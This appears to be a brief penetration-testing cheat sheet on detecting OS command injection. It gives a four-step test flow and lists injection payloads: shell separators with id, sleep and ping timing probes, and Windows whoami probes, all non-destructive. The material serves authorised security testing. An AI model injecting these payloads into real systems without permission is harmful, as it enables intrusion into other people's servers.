# OS Command Injection

## Test flow

1. Identify inputs passed to shell commands (ping, traceroute, conversion tools).
2. Start with harmless separators to detect command concatenation.
3. Confirm blind and reflected execution channels.
4. Evaluate execution context and reachable internal resources.

## Payload examples

### Separators

- `;id`
- `&&id`
- `|id`
- `` `id` ``
- `$(id)`

### Time-based probes

- `;sleep 5`
- `&& ping -c 5 127.0.0.1`

### Windows probes

- `& whoami`
- `| whoami`

## Notes

- Prefer non-destructive proofs (`id`, `whoami`, `sleep`) unless scope allows more.
- Include exact sink behavior in report (sanitization failure and execution path).
